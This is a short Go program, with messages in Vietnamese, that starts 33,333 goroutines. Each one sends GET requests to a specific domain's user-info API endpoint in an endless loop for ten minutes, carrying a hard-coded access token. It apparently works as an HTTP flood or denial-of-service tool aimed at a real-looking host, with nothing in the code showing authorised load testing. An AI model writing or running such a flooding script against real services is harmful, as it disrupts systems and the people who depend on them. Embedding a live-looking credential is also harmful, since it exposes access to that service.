package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

func main() {
	for i := 0; i < 33333; i++ {
		go start()
	}
	time.Sleep(time.Minute * 10)
	fmt.Println("end game")
}

func start() {
	url := "https://tmdtqt.democaigido.online/api/webapi/userInfo" // Địa chỉ của API

	for {
		fmt.Println("new ")
		request, _ := http.NewRequest("GET", url, nil)
		request.Header.Add("X-Access-Token", "7ee99d0c6e803544792b26c31bde0f3a")
		response, err := http.DefaultClient.Do(request)
		if err != nil {
			fmt.Println("Lỗi khi gửi yêu cầu:", err)
			return
		}
		defer response.Body.Close()
		_, err = ioutil.ReadAll(response.Body)
		if err != nil {
			fmt.Println("Lỗi khi đọc dữ liệu từ phản hồi:", err)
			return
		}
		fmt.Println("goi xong")
	}
}
